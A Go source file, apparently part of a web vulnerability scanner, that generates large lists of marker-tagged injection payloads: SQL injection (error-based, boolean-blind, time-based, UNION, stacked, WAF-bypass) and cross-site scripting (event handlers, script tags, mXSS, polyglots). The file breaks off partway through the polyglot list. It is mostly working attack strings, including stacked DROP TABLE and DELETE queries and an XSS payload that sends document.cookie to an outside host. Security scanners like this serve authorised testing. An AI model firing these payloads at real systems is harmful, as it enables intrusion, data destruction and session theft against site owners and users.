package inject

import (
	"fmt"
	"strings"
	"sync"
)

type PayloadDef struct {
	Value string
	Check string
	Name  string
}

var totalOnce sync.Once
var totalCount int

func TotalPayloads() int {
	totalOnce.Do(func() {
		totalCount += len(GenErrorBasedSQLiPayloads())
		totalCount += len(GenBooleanBlindSQLiPayloads())
		totalCount += len(GenTimeBasedSQLiPayloads())
		totalCount += len(GenUnionSQLiPayloads())
		totalCount += len(GenStackedSQLiPayloads())
		totalCount += len(GenSecondOrderSQLiPayloads())
		totalCount += len(GenSQLiWAFBypassPayloads())
		totalCount += len(GenXSSEventHandlersPayloads())
		totalCount += len(GenXSSBasicScriptPayloads())
		totalCount += len(GenXSSMXSSPayloads())
		totalCount += len(GenXSSPolyglotPayloads())
		totalCount += len(GenXSSDOMBasedPayloads())
		totalCount += len(GenXSSWAFBypassPayloads())
		totalCount += len(GenXSSFrameworkPayloads())
		totalCount += len(GenXSSBlindPayloadsExpanded())
		totalCount += len(GenLFIPathTraversalPayloads())
		totalCount += len(GenLFIPHPWrapperPayloads())
		totalCount += len(GenLFIWindowsPayloads())
		totalCount += len(GenLFIProcSelfPayloads())
		totalCount += len(GenLFIEncodingBypassPayloads())
		totalCount += len(GenSSRFInternalIPPayloads())
		totalCount += len(GenSSRFCloudMetadataPayloads())
		totalCount += len(GenSSRFProtocolPayloads())
		totalCount += len(GenSSRFBypassPayloads())
		totalCount += len(GenXXEClassicExpandedPayloads())
		totalCount += len(GenXXEBlindOOBPayloads())
		totalCount += len(GenXXESOAPExpandedPayloads())
		totalCount += len(GenXXEJSONExpandedPayloads())
		totalCount += len(GenXXESVGXIncludePayloads())
		totalCount += len(GenCMDiLinuxExpandedPayloads())
		totalCount += len(GenCMDiWindowsExpandedPayloads())
		totalCount += len(GenCMDiTimePayloads())
		totalCount += len(GenCMDiBlindOOBPayloads())
		totalCount += len(GenCMDiWAFBypassPayloads())
		totalCount += len(GenSSTIJinjaPayloads())
		totalCount += len(GenSSTITwigPayloads())
		totalCount += len(GenSSTIFreeMarkerPayloads())
		totalCount += len(GenSSTIVelocityPayloads())
		totalCount += len(GenSSTIERBPayloads())
		totalCount += len(GenSSTISmartyPayloads())
		totalCount += len(GenSSTIJadePugPayloads())
		totalCount += len(GenNoSQLiMongoPayloads())
		totalCount += len(GenNoSQLiCouchbasePayloads())
		totalCount += len(GenNoSQLiFirebasePayloads())
		totalCount += len(GenNoSQLiDynamoPayloads())
		totalCount += len(GenLDAPPayloads())
		totalCount += len(GenXPathPayloads())
		totalCount += len(GenCRLFInjectionPayloads())
		totalCount += len(GenCORSPayloads())
		totalCount += len(GenOpenRedirectPayloads())
		totalCount += len(GenOpenRedirectURLs())
	})
	return totalCount
}

func padMarker(prefix string, n int) string {
	return fmt.Sprintf("FNG_%s_%04d", prefix, n)
}

func safeSlice(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

var sqlBase = []string{
	"1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
	"') OR 1=1--", "\") OR 1=1--", "')) OR 1=1--", "\")) OR 1=1--",
	"' OR 1=1#", "\" OR 1=1#", "' OR 1=1/*", "\" OR 1=1/*",
	"' AND 1=1--", "\" AND 1=1--", "' AND 1=2--", "\" AND 1=2--",
	"' OR 'a'='a", "' OR 'a'='b", "' AND 'a'='a", "' AND 'a'='b",
}

func GenErrorBasedSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	comment := []string{"--", "#", "/*", "-- ", "--+", "//"}
	quote := []string{"'", "\"", "`)", "')", "'))", "\"))", "`))"}
	mysqlErr := []string{
		"EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))",
		"UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)",
		"(SELECT * FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
		"EXP(~(SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"GEOMCOLLECTION((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"MULTIPOLYGON((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"LINESTRING((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"MULTILINESTRING((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"MULTIPOINT((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
		"POLYGON((SELECT * FROM(SELECT CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a))",
	}
	for _, q := range quote {
		for _, c := range comment {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s OR 1=1 %s %s", q, c, m),
				Check: m, Name: fmt.Sprintf("MySQL-Err-Simple-%d", n),
			})
		}
	}
	for i, ef := range mysqlErr {
		for _, c := range comment {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", ef, c, m),
				Check: m, Name: fmt.Sprintf("MySQL-Err-Func-%d", i),
			})
		}
	}
	mssqlErr := []string{
		"CONVERT(INT,(SELECT @@VERSION))",
		"CAST((SELECT @@VERSION) AS INT)",
		"(SELECT TOP 1 CHARINDEX('a',(SELECT @@VERSION)))",
		"1/@@ROWCOUNT",
		"1/(SELECT TOP 1 1 FROM sys.tables)",
		"1/(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)",
		"CONVERT(INT,(SELECT DB_NAME()))",
		"CAST((SELECT DB_NAME()) AS INT)",
		"1/(SELECT TOP 1 1 FROM sys.sysobjects)",
		"1/(SELECT TOP 1 1 FROM sys.databases)",
		"CONVERT(INT,@@SERVERNAME)",
		"1/(SELECT COUNT(*) FROM sys.tables HAVING COUNT(*)=1)",
		"1/(SELECT COUNT(*) FROM sys.columns HAVING COUNT(*)=1)",
		"1/(SELECT COUNT(*) FROM sys.sysobjects HAVING COUNT(*)=1)",
		"1/(SELECT COUNT(*) FROM sys.databases HAVING COUNT(*)=1)",
	}
	for i, ef := range mssqlErr {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", ef, c, m),
				Check: m, Name: fmt.Sprintf("MSSQL-Err-%d", i),
			})
		}
	}
	oracleErr := []string{
		"UTL_INADDR.GET_HOST_ADDRESS('x')",
		"CTXSYS.DRITHSX.SN(1,'x')",
		"ORDCOM.DATALOAD('x')",
		"TO_NUMBER((SELECT SUBSTR(USER,1,1) FROM DUAL))",
		"TO_CHAR((SELECT SUBSTR(USER,1,1) FROM DUAL))",
		"TO_DATE((SELECT SUBSTR(USER,1,1) FROM DUAL))",
		"XMLTYPE('<x>')",
		"DBMS_XMLGEN.NEWCONTEXTFROMHIERARCHY('x')",
	}
	for i, ef := range oracleErr {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", ef, c, m),
				Check: m, Name: fmt.Sprintf("Oracle-Err-%d", i),
			})
		}
	}
	pgErr := []string{
		"CAST(CHR(65) AS INTEGER)",
		"1/(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)",
		"1/(SELECT 1/0 FROM pg_sleep(-1))",
		"TO_CHAR(1,'x')",
		"TO_NUMBER('x','x')",
		"1/(SELECT 1 FROM PG_SLEEP(0))",
		"1/(SELECT 1 FROM GENERATE_SERIES(1,0))",
	}
	for i, ef := range pgErr {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", ef, c, m),
				Check: m, Name: fmt.Sprintf("PG-Err-%d", i),
			})
		}
	}
	sqliteErr := []string{
		"1/(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)",
		"randomblob(1000000000)",
		"zeroblob(1000000000)",
		"1/(SELECT COUNT(*) FROM sqlite_master HAVING COUNT(*)=1)",
		"1/(SELECT COUNT(*) FROM sqlite_master)",
	}
	for i, ef := range sqliteErr {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLEM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", ef, c, m),
				Check: m, Name: fmt.Sprintf("SQLite-Err-%d", i),
			})
		}
	}
	for _, base := range sqlBase {
		n++
		m := padMarker("SQLEM", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", base, m),
			Check: m, Name: fmt.Sprintf("SQL-Base-%d", n),
		})
	}
	return p
}

func GenBooleanBlindSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	trueCond := map[string][]string{
		"MySQL":    {"1=1", "2>1", "'a'='a'", "1", "(SELECT 1)", "IF(1=1,1,0)", "0x1=1", "NULL IS NULL", "1+1=2", "2*3=6"},
		"MSSQL":    {"1=1", "2>1", "'a'='a'", "1", "(SELECT 1)", "IIF(1=1,1,0)", "NULL IS NULL", "1+1=2", "2*3=6", "CHOOSE(1,1)=1"},
		"Oracle":   {"1=1", "2>1", "'a'='a'", "1", "(SELECT 1 FROM DUAL)", "DECODE(1,1,1,0)", "NULL IS NULL", "1+1=2", "2*3=6", "LENGTH('a')=1"},
		"Postgres": {"1=1", "2>1", "'a'='a'", "1", "(SELECT 1)", "NULL IS NULL", "1+1=2", "2*3=6", "TRUE", "'b'='b'"},
		"SQLite":   {"1=1", "2>1", "'a'='a'", "1", "(SELECT 1)", "NULL IS NULL", "1+1=2", "2*3=6", "LENGTH('a')=1", "TYPEOF(1)='integer'"},
	}
	falseCond := map[string][]string{
		"MySQL":    {"1=2", "2<1", "'a'='b'", "0", "(SELECT 0)", "IF(1=2,1,0)", "0x0=1", "NULL IS NOT NULL", "1+1=3", "2*3=7"},
		"MSSQL":    {"1=2", "2<1", "'a'='b'", "0", "(SELECT 0)", "IIF(1=2,1,0)", "NULL IS NOT NULL", "1+1=3", "2*3=7", "CHOOSE(1,2)=1"},
		"Oracle":   {"1=2", "2<1", "'a'='b'", "0", "(SELECT 0 FROM DUAL)", "DECODE(1,2,1,0)", "NULL IS NOT NULL", "1+1=3", "2*3=7", "LENGTH('a')=2"},
		"Postgres": {"1=2", "2<1", "'a'='b'", "0", "(SELECT 0)", "NULL IS NOT NULL", "1+1=3", "2*3=7", "FALSE", "'b'='c'"},
		"SQLite":   {"1=2", "2<1", "'a'='b'", "0", "(SELECT 0)", "NULL IS NOT NULL", "1+1=3", "2*3=7", "LENGTH('a')=2", "TYPEOF(1)='text'"},
	}
	for db, conds := range trueCond {
		for _, c := range conds {
			n++
			m := padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR %s-- %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolTrue-%s-%d", db, n),
			})
			n++
			m = padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("1' AND %s-- %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolTrueInt-%s-%d", db, n),
			})
		}
	}
	for db, conds := range falseCond {
		for _, c := range conds {
			n++
			m := padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s-- %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolFalse-%s-%d", db, n),
			})
		}
	}
	for db, conds := range trueCond {
		for _, c := range conds[:5] {
			n++
			m := padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("\" OR %s-- %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolTrueDbl-%s-%d", db, n),
			})
			n++
			m = padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR %s# %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolTrueHash-%s-%d", db, n),
			})
			n++
			m = padMarker("SQLBB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR %s/* %s", c, m),
				Check: m, Name: fmt.Sprintf("BoolTrueComment-%s-%d", db, n),
			})
		}
	}
	for i := 1; i <= 50; i++ {
		n++
		m := padMarker("SQLBB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("' OR (SELECT CASE WHEN (SELECT LENGTH(USER()))=%d THEN 1 ELSE 0 END)=1-- %s", i, m),
			Check: m, Name: fmt.Sprintf("Bool-Length-%d", i),
		})
	}
	for i := 0; i <= 127; i++ {
		n++
		m := padMarker("SQLBB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("' OR (SELECT CASE WHEN ASCII(SUBSTR(USER(),1,1))=%d THEN 1 ELSE 0 END)=1-- %s", i, m),
			Check: m, Name: fmt.Sprintf("Bool-ASCII-%d", i),
		})
	}
	return p
}

func GenTimeBasedSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	mysqlTime := []string{
		"SLEEP(1)", "SLEEP(2)", "SLEEP(3)", "SLEEP(5)",
		"BENCHMARK(10000000,MD5('x'))", "BENCHMARK(5000000,SHA1('x'))",
		"BENCHMARK(10000000,SHA2('x',256))",
		"BENCHMARK(20000000,MD5('x'))",
		"(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B)",
		"GET_LOCK('x',1)",
	}
	for _, t := range mysqlTime {
		for _, c := range []string{"--", "#", "/*"} {
			n++
			m := padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("MySQL-Time-%d", n),
			})
			n++
			m = padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR %s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("MySQL-Time-OR-%d", n),
			})
		}
	}
	mssqlTime := []string{
		"WAITFOR DELAY '0:0:1'", "WAITFOR DELAY '0:0:2'",
		"WAITFOR DELAY '0:0:3'", "WAITFOR DELAY '0:0:5'",
		"WAITFOR TIME '01:01:01'",
		"(SELECT COUNT(*) FROM sysobjects A, sysobjects B)",
	}
	for _, t := range mssqlTime {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("';%s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("MSSQL-Time-%d", n),
			})
		}
	}
	oracleTime := []string{
		"DBMS_LOCK.SLEEP(1)", "DBMS_LOCK.SLEEP(2)", "DBMS_LOCK.SLEEP(5)",
		"UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')",
		"UTL_HTTP.REQUEST('http://10.0.0.1')",
	}
	for _, t := range oracleTime {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("Oracle-Time-%d", n),
			})
		}
	}
	pgTime := []string{
		"PG_SLEEP(1)", "PG_SLEEP(2)", "PG_SLEEP(3)", "PG_SLEEP(5)",
		"PG_SLEEP(10)", "(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))",
	}
	for _, t := range pgTime {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("';%s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("PG-Time-%d", n),
			})
			n++
			m = padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR %s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("PG-Time-OR-%d", n),
			})
		}
	}
	sqliteTime := []string{
		"RANDOMBLOB(100000000)", "RANDOMBLOB(500000000)", "RANDOMBLOB(1000000000)",
		"ZEROBLOB(100000000)", "ZEROBLOB(500000000)", "ZEROBLOB(1000000000)",
		"LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))",
	}
	for _, t := range sqliteTime {
		for _, c := range []string{"--", "//"} {
			n++
			m := padMarker("SQLTB", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' AND %s %s %s", t, c, m),
				Check: m, Name: fmt.Sprintf("SQLite-Time-%d", n),
			})
		}
	}
	return p
}

func GenUnionSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	prefixes := []string{"'", "\"", "1'", "1\"", "')", "\")", "'))", "\"))"}
	for _, pref := range prefixes {
		for cols := 1; cols <= 50; cols++ {
			n++
			m := padMarker("SQLUN", n)
			sel := "NULL"
			for c := 2; c <= cols; c++ {
				sel += ",NULL"
			}
			if cols%5 == 0 {
				sel = ""
				for c := 1; c <= cols; c++ {
					if c > 1 {
						sel += ","
					}
					sel += fmt.Sprintf("'col%d'", c)
				}
			}
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s UNION SELECT %s-- %s", pref, sel, m),
				Check: m, Name: fmt.Sprintf("Union-%dcols-%d", cols, n),
			})
		}
	}
	for _, pref := range []string{"'", "\"", "1'"} {
		for cols := 1; cols <= 50; cols++ {
			n++
			m := padMarker("SQLUN", n)
			sel := "NULL"
			for c := 2; c <= cols; c++ {
				sel += ",NULL"
			}
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s UNION ALL SELECT %s-- %s", pref, sel, m),
				Check: m, Name: fmt.Sprintf("UnionAll-%dcols-%d", cols, n),
			})
		}
	}
	dbspecific := map[string][]string{
		"MySQL":    {"", "#", "/*"},
		"MSSQL":    {"", "//"},
		"Oracle":   {"FROM DUAL--", "FROM DUAL//", ""},
		"Postgres": {"", "//"},
	}
	for db, cmts := range dbspecific {
		for _, cmt := range cmts {
			for cols := 1; cols <= 10; cols++ {
				n++
				m := padMarker("SQLUN", n)
				sel := "NULL"
				for c := 2; c <= cols; c++ {
					sel += ",NULL"
				}
				if cmt == "FROM DUAL--" || cmt == "FROM DUAL//" {
					p = append(p, PayloadDef{
						Value: fmt.Sprintf("' UNION SELECT %s %s %s", sel, cmt, m),
						Check: m, Name: fmt.Sprintf("Union-%s-%dcols-%d", db, cols, n),
					})
				} else {
					p = append(p, PayloadDef{
						Value: fmt.Sprintf("' UNION SELECT %s-- %s %s", sel, cmt, m),
						Check: m, Name: fmt.Sprintf("Union-%s-%dcols-%d", db, cols, n),
					})
				}
			}
		}
	}
	return p
}

func GenStackedSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	ops := []string{";", "';", "\";", "1';", "1\";", "');", "\");"}
	for _, op := range ops {
		for _, cmd := range []string{
			"DROP TABLE IF EXISTS test",
			"CREATE TABLE test(col1 int)",
			"INSERT INTO test VALUES(1)",
			"DELETE FROM test",
			"UPDATE test SET col1=1",
			"SELECT 1",
			"SELECT @@VERSION",
			"SELECT DB_NAME()",
		} {
			n++
			m := padMarker("SQLST", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s %s-- %s", op, cmd, m),
				Check: m, Name: fmt.Sprintf("Stacked-%d", n),
			})
		}
	}
	for _, db := range []string{"MySQL", "MSSQL", "Postgres"} {
		for _, cmd := range []string{
			"SELECT * FROM users",
			"SELECT COUNT(*) FROM information_schema.tables",
			"SELECT name FROM sqlite_master",
			"SELECT table_name FROM all_tables",
		} {
			n++
			m := padMarker("SQLST", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("';%s-- %s", cmd, m),
				Check: m, Name: fmt.Sprintf("Stacked-%s-%d", db, n),
			})
		}
	}
	return p
}

func GenSecondOrderSQLiPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	payloads := []string{
		"'", "\"", "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1",
		"1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--",
		"admin'--", "admin'#", "admin'/*", "root'--",
	}
	for i, pl := range payloads {
		for j := 0; j < 10; j++ {
			n++
			m := padMarker("SQLSO", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s %s", pl, m),
				Check: m, Name: fmt.Sprintf("SecondOrder-%d-%d", i, j),
			})
		}
	}
	return p
}

func GenSQLiWAFBypassPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	comment := []string{
		"/**/", "/*!*/", "/*!12345*/", "-- ",
		"#", "/*", "//", "--+",
		"/*!50000*/", "/*!40000*/",
	}
	obfu := []string{
		"UNION", "union", "UnIoN", "uNiOn", "UNION ALL",
		"SELECT", "select", "SeLeCt", "sElEcT",
		"OR", "or", "Or", "oR",
		"AND", "and", "And", "aNd",
		"SLEEP", "sleep", "Sleep", "sLeEp",
		"BENCHMARK", "benchmark", "Benchmark",
	}
	for _, c := range comment {
		for i := 0; i < len(obfu); i += 2 {
			n++
			m := padMarker("SQLWF", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' %s%s%s-- %s", obfu[i], c, obfu[i+1], m),
				Check: m, Name: fmt.Sprintf("WAF-Comment-%d", n),
			})
		}
	}
	he := []string{
		"0x", "\\x", "CHAR(", "UNHEX(", "CONCAT(CHAR(",
	}
	for _, h := range he {
		for i := 0; i < 20; i++ {
			n++
			m := padMarker("SQLWF", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("' OR 1=1 %s-- %s", h, m),
				Check: m, Name: fmt.Sprintf("WAF-Encoding-%d", n),
			})
		}
	}
	pct := []string{
		"%00", "%0a", "%0d", "%20", "%09", "%0b", "%0c",
	}
	for _, pc := range pct {
		for i := 0; i < 10; i++ {
			n++
			m := padMarker("SQLWF", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("'%sOR%s1=1-- %s", pc, pc, m),
				Check: m, Name: fmt.Sprintf("WAF-Whitespace-%d", n),
			})
		}
	}
	nullbytes := []string{"%00", "\\x00", "NULL"}
	for _, nb := range nullbytes {
		for _, base := range []string{"' OR 1=1--", "' UNION SELECT 1--"} {
			n++
			m := padMarker("SQLWF", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", base, nb, m),
				Check: m, Name: fmt.Sprintf("WAF-NullByte-%d", n),
			})
		}
	}
	return p
}

var xssTags = []string{
	"script", "img", "svg", "body", "input", "details", "select",
	"textarea", "video", "audio", "a", "iframe", "object", "embed",
	"marquee", "table", "td", "tr", "div", "span", "p", "form",
	"button", "option", "frameset", "frame", "link", "base",
	"bgsound", "listing", "noembed", "noscript", "plaintext", "xmp",
	"blink", "keygen", "meter", "output", "progress", "wbr",
	"math", "style", "title", "meta", "isindex",
}

var xssHandlers = []string{
	"onload", "onerror", "onfocus", "onblur", "onchange", "onselect",
	"onsubmit", "onreset", "onclick", "ondblclick", "onmousedown",
	"onmouseup", "onmouseover", "onmousemove", "onmouseout",
	"onkeydown", "onkeypress", "onkeyup", "onabort", "oncanplay",
	"oncanplaythrough", "oncontextmenu", "oncuechange", "ondrag",
	"ondragend", "ondragenter", "ondragexit", "ondragleave",
	"ondragover", "ondragstart", "ondrop", "oninput", "oninvalid",
	"onloadstart", "onloadeddata", "onloadedmetadata", "onmessage",
	"onmousewheel", "onpause", "onplay", "onplaying", "onprogress",
	"onratechange", "onreadystatechange", "onscroll", "onseeked",
	"onseeking", "onshow", "onstalled", "onsuspend", "ontimeupdate",
	"ontoggle", "onvolumechange", "onwaiting", "onwheel",
	"ongotpointercapture", "onlostpointercapture", "onauxclick",
	"onsearch", "onpointerdown", "onpointerup", "onpointermove",
	"onpointerover", "onpointerout", "onpointerenter", "onpointerleave",
	"onpointercancel", "ongotpointercapture", "onlostpointercapture",
	"onbeforecopy", "onbeforecut", "onbeforepaste", "oncopy", "oncut",
	"onpaste", "onwebkitanimationend", "onwebkitanimationiteration",
	"onwebkitanimationstart", "onwebkittransitionend",
	"onanimationend", "onanimationiteration", "onanimationstart",
}

func GenXSSEventHandlersPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	events := []string{"alert", "prompt", "confirm"}
	for _, tag := range xssTags {
		for _, handler := range xssHandlers {
			for _, evt := range events {
				n++
				m := padMarker("XSSEH", n)
				val := fmt.Sprintf("<%s %s=%s(%s)>", tag, handler, evt, m)
				p = append(p, PayloadDef{
					Value: val, Check: m,
					Name: fmt.Sprintf("Evt-%s-%s-%s", tag, handler, evt),
				})
				if n%100 == 0 {
					n++
					m = padMarker("XSSEH", n)
					val = fmt.Sprintf("<%s %s=\"%s(%s)\">", tag, handler, evt, m)
					p = append(p, PayloadDef{
						Value: val, Check: m,
						Name: fmt.Sprintf("EvtQ-%s-%s-%s", tag, handler, evt),
					})
				}
			}
		}
	}
	return p
}

func GenXSSBasicScriptPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	scripts := []string{
		"<script>alert(1)</script>",
		"<script>prompt(1)</script>",
		"<script>confirm(1)</script>",
		"<SCRIPT>alert(1)</SCRIPT>",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<script src=data:text/javascript,alert(1)>",
		"<script src=data:,alert(1)>",
		"<script src=\"data:text/javascript,alert(1)\">",
		"<script/src=data:,alert(1)>",
		"<script/src=\"data:,alert(1)\">",
		"<script \x00type=text/javascript>alert(1)</script>",
		"<script type=\"text/javascript\">alert(1)</script>",
		"<script language=\"javascript\">alert(1)</script>",
		"<script charset=\"utf-8\">alert(1)</script>",
		"<script defer>alert(1)</script>",
		"<script async>alert(1)</script>",
		"<script crossorigin>alert(1)</script>",
	}
	for _, s := range scripts {
		n++
		m := padMarker("XSSBS", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s<!-- %s -->", s, m),
			Check: m, Name: fmt.Sprintf("Script-Basic-%d", n),
		})
	}
	encodings := []string{
		"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
		"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
		"&lt;script&gt;alert(1)&lt;/script&gt;",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
	}
	for _, enc := range encodings {
		for _, ctx := range []string{"", "\"", "'"} {
			n++
			m := padMarker("XSSBS", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", ctx, enc, m),
				Check: m, Name: fmt.Sprintf("Script-Enc-%d", n),
			})
		}
	}
	for _, tag := range []string{"svg", "body", "div", "span", "a", "p"} {
		n++
		m := padMarker("XSSBS", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("<%s><script>alert(1)</script></%s><!-- %s -->", tag, tag, m),
			Check: m, Name: fmt.Sprintf("Script-Wrap-%s", tag),
		})
	}
	return p
}

func GenXSSMXSSPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	mxss := []struct {
		val string
		chk string
	}{
		{`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<svg><p title="</svg><img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<math><p title="</math><img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<style><p title="</style><img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<title><p title="</title><img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<script>/*</script><img src=x onerror=alert(1)>`, "alert(1)"},
		{`<script><!--//--></script><img src=x onerror=alert(1)>`, "alert(1)"},
		{`<![CDATA[<img src=x onerror=alert(1)>]]>`, "alert(1)"},
		{`<!--><img src=x onerror=alert(1)>-->`, "alert(1)"},
		{`<?xml?><img src=x onerror=alert(1)>`, "alert(1)"},
		{`<![<img src=x onerror=alert(1)>]>`, "alert(1)"},
		{"<script>x=alert(1)</script>", "alert(1)"},
		{"<iframe<iframe src=x onerror=alert(1)>>", "alert(1)"},
		{`<object><param name="test" value="<script>alert(1)</script>">`, "alert(1)"},
		{`<embed src="data:image/svg+xml,<script>alert(1)</script>">`, "alert(1)"},
	}
	for _, m := range mxss {
		for i := 0; i < 5; i++ {
			n++
			chk := padMarker("XSSMX", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s<!-- %s -->", m.val, chk),
				Check: chk, Name: fmt.Sprintf("mXSS-%d", n),
			})
		}
	}
	return p
}

func GenXSSPolyglotPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	polyglots := []string{
		`jaVasCript:/*-/*` + "`" + `/*\` + "`" + `/*'/*"/**/( /* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
		`/*-/*` + "`" + `/*\` + "`" + `/*'/*"/**/( /* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
		`<svg onload=alert(1)//
` + "`" + `<svg onload=alert(1)>//
` + "`" + `"` + `><svg onload=alert(1)>
` + "`" + `'><svg onload=alert(1)>
`,
		`'"--!>=<svg onload=alert(1)>`,
		`<img src=x onerror="fetch('https://x.com/'+document.cookie)">`,
		`<script>eval(atob('YWxlcnQoMSk='))</script>`,
